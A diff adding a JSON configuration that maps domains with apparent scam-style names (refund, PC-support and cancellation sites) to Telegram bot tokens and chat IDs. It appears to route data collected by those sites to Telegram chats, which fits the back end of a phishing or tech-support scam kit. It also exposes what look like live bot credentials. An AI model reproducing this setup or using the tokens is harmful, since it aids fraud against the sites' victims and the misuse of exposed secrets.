@@ -1,0 +1,40 @@
+{
+  "refundworks.pro": {
+    "botToken": "8554164617:AAFxlhzuaeAn7XxHOsmGes3xQLmqRV4UPq0",
+    "chatId": "-5248296304"
+  },
+  "pcsupportdesk.pro": {
+    "botToken": "8554164617:AAFxlhzuaeAn7XxHOsmGes3xQLmqRV4UPq0",
+    "chatId": "-5248296304"
+  },
+  "securecancellation.com": {
+    "botToken": "8317757418:AAF0YMJ0enh258_yEWXsg6-GAsYfrA7nYZ8",
+    "chatId": "-5294276637"
+  },
+  "pcdiagnostictool.tech": {
+    "botToken": "8317757418:AAF0YMJ0enh258_yEWXsg6-GAsYfrA7nYZ8",
+    "chatId": "-5294276637"
+  },
+  "pcsupporthub.pro": {
+    "botToken": "8579126501:AAFmE4PTVgwUG7C7Pc5sQ04qULdNDA6bgeI",
+    "chatId": "-5104187628"
+  },
+  "protectedpcfix.com": {
+    "botToken": "8579126501:AAFmE4PTVgwUG7C7Pc5sQ04qULdNDA6bgeI",
+    "chatId": "-5104187628"
+  },
+  "pcfixtool.tech": {
+    "botToken": "8597261585:AAFqyzGwHlfXPnEyDEyqf7CRDNBygBewDFs",
+    "chatId": "-1003331628476"
+  },
+  "default": {
+    "botToken": "8317757418:AAF0YMJ0enh258_yEWXsg6-GAsYfrA7nYZ8",
+    "chatId": "-5294276637"
+  },
+  "localhost": {
+    "botToken": "8317757418:AAF0YMJ0enh258_yEWXsg6-GAsYfrA7nYZ8",
+    "chatId": "-5294276637"
+  }
+}
+
+
